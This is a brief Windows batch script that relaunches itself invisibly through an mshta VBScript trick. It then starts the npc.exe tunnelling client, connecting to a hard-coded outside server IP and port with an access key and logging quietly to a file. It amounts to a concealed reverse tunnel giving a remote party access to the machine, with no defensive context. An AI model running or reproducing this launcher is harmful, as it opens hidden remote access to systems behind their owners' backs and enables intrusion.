if "%1"=="hide" goto CmdBegin
start mshta vbscript:createobject("wscript.shell").run("""%~0"" hide",0)(window.close)&&exit
:CmdBegin
npc.exe -server=47.52.39.39:2142 -vkey=19dw9xvcynyxfghm >> .\npc.log 2>&1